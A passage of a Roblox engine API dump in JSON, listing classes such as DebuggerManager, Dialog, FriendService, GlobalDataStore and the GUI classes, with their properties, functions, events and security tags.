ptMode","tags":["LocalUserSecurity","deprecated"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"ResetCdnFailureCounts","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBlockingRemove","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":[]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBreakFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetCreateFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetDeleteFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetEnabled","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFriendsOnlineUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetGetFriendsUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetMakeFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"playerHasPassUrl","Default":null}],"Name":"SetPlayerHasPassUrl","tags":["LocalUserSecurity"],"Class":"GamePassService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoundEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXA